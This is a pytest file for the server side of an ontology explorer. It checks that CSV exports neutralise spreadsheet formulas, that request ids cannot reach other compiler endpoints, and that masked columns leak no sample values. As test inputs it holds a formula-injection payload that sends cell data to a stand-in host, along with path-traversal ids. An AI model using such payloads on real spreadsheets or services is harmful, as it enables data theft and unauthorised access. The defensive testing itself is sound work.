"""The Ontology explorer's server side without the compiler binary: the CSV export is safe to open in a spreadsheet,
and ids from a request cannot steer Cairn's calls to the compiler to another of its endpoints."""

import csv
import io

import httpx
import pytest

from cairn.context.ontology_compiler import OntologyClient, OntologyCompiler, OntologyError
from cairn.context.ontology_explorer import OntologyExplorer

T = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.orders,PROD)"
U = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.customers,PROD)"


class _View:
    def __init__(self, v):
        self.v = v

    def view(self, can_view):
        return OntologyCompiler.visible(self.v, can_view)


def test_csv_export_neutralises_spreadsheet_formulas():
    evil = '=HYPERLINK("http://x.example/?"&A1,"open")'
    v = {"run_id": "r", "version": 1, "tables": [{"table_id": T}, {"table_id": U}],
         "terms": [{"id": "t1", "name": "+Order", "table_id": T, "table_name": "orders", "description": evil,
                    "provenance": [{"source": "model", "confidence": 0.9}]}],
         "attributes": [{"id": "a1", "name": "@total", "table_id": T, "column": "-amount", "term_id": "t1",
                         "description": "\t=1+1"}],
         "relationships": [{"id": "r1", "source_table": T, "target_table": U, "source_column": "=cid",
                            "target_column": "id", "cardinality": "many_to_one", "confidence": 0.8,
                            "rationale": "-2+3"}],
         "metrics": [{"id": "m1", "name": "=SUM(1)", "tables": [T], "source": "query", "description": "@x"}],
         "bridges": []}
    out = OntologyExplorer(_View(v)).csv(lambda urn: True)
    rows = list(csv.reader(io.StringIO(out)))
    cells = [c for row in rows[1:] for c in row]
    assert not [c for c in cells if c[:1] in ("=", "+", "-", "@", "\t", "\r")], cells
    assert "'" + evil in cells and "'+Order" in cells       # kept, readable, but text
    assert any(c == "0.9" for c in cells)                   # numbers stay numbers


def _client(seen: list[str]) -> OntologyClient:
    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req.url.raw_path.decode())
        if req.url.path == "/v1/terms":     # every term of every dataset: must never be reached this way
            return httpx.Response(200, json={"version": 1, "terms": [{"term": {"name": "Secret"}}]})
        return httpx.Response(404, json={"error": "no such element"})
    return OntologyClient("http://compiler", "t" * 32, http=httpx.Client(transport=httpx.MockTransport(handler)))


@pytest.mark.parametrize("kind,eid", [("..", "terms"), (".", "../terms"), ("term", "x?y=1"), ("term", "a/../../terms")])
def test_provenance_ids_stay_in_their_path_segment(kind, eid):
    seen: list[str] = []
    c = _client(seen)
    with pytest.raises(OntologyError) as e:
        c.provenance(kind, eid)
    assert e.value.status == 404
    assert all(p.startswith("/v1/provenance/") and p.count("/") == 4 for p in seen), seen


@pytest.mark.parametrize("rid", ["..", ".", "x?a=b", "../terms"])
def test_run_ids_stay_in_their_path_segment(rid):
    seen: list[str] = []
    c = _client(seen)
    for call in (c.run, c.cancel, c.resume):
        with pytest.raises(OntologyError):
            call(rid)
    assert all(p.startswith("/v1/runs/") and "/v1/terms" not in p for p in seen), seen


class _Graph:
    """One dataset whose stored profile holds raw values of every column (``ssn`` included)."""

    def scroll_entities(self, kind, aspects):
        return [{"urn": T, "schemaMetadata": {"fields": [{"fieldPath": "id", "nativeDataType": "bigint"},
                                                         {"fieldPath": "ssn", "nativeDataType": "varchar"},
                                                         {"fieldPath": "secret", "nativeDataType": "varchar"}]}}]

    def get_timeseries(self, urn, aspect, n):
        return [{"rowCount": 2, "fieldProfiles": [
            {"fieldPath": "id", "sampleValues": ["1", "2"]},
            {"fieldPath": "ssn", "sampleValues": ["123-45-6789"],
             "distinctValueFrequencies": [{"value": "123-45-6789"}]},
            {"fieldPath": "secret", "sampleValues": ["hunter2"], "distinctValueFrequencies": [{"value": "hunter2"}]}]}]


class _Access:
    def __init__(self, fail=False):
        self.fail = fail

    def preview(self, actor, urn, limit):
        if self.fail:
            raise PermissionError("you may not see this dataset's data")
        # ``ssn`` is masked for the sampling person; ``secret`` is not shown to them at all.
        return {"columns": ["id", "ssn"], "rows": [[1, "***"], [2, "***"]], "masked_columns": ["ssn"]}


def _columns(access, sample_as="urn:li:corpuser:sampler") -> dict:
    c = OntologyCompiler(_client([]), None, _Graph(), data_access=access, sample_as=sample_as)
    return {col["name"]: col for col in c.snapshot()["tables"][0]["columns"]}


def test_masked_and_hidden_columns_send_no_profile_values():
    cols = _columns(_Access())
    assert cols["id"]["samples"] == [1, 2]
    for name in ("ssn", "secret"):
        assert cols[name]["samples"] == [] and cols[name]["distinct_values"] is None, cols[name]


def test_refused_sample_sends_no_profile_values():
    cols = _columns(_Access(fail=True))
    for col in cols.values():
        assert col["samples"] == [] and col["distinct_values"] is None, col


class _TwoTables(_Graph):
    def scroll_entities(self, kind, aspects):
        row = super().scroll_entities(kind, aspects)[0]
        return [row, {**row, "urn": U}]


class _Recording(_Access):
    def __init__(self):
        super().__init__()
        self.read: list[str] = []

    def preview(self, actor, urn, limit):
        self.read.append(urn)
        return super().preview(actor, urn, limit)


@pytest.mark.parametrize("allow,deny", [(None, "^cust"), ("^ord", None), ("ord", "^customers$")])
def test_tables_kept_out_are_neither_sampled_nor_sent(allow, deny):
    access = _Recording()
    c = OntologyCompiler(_client([]), None, _TwoTables(), data_access=access, sample_as="urn:li:corpuser:sampler",
                         table_allow=allow, table_deny=deny)
    snap = c.snapshot()
    assert [t["id"] for t in snap["tables"]] == [T] and access.read == [T]
    assert snap["filter"] == {"table_allow_regex": allow, "table_deny_regex": deny}


def test_an_invalid_table_filter_refuses_the_sync():
    c = OntologyCompiler(_client([]), None, _TwoTables(), data_access=_Recording(), sample_as="urn:li:corpuser:x",
                         table_deny="(")
    with pytest.raises(OntologyError) as e:
        c.snapshot()
    assert e.value.status == 422


def test_without_a_sampling_person_profiles_are_sent():
    cols = _columns(None, sample_as=None)       # documented: an empty sampleAs sends profiles only
    assert cols["ssn"]["samples"] == ["123-45-6789"]
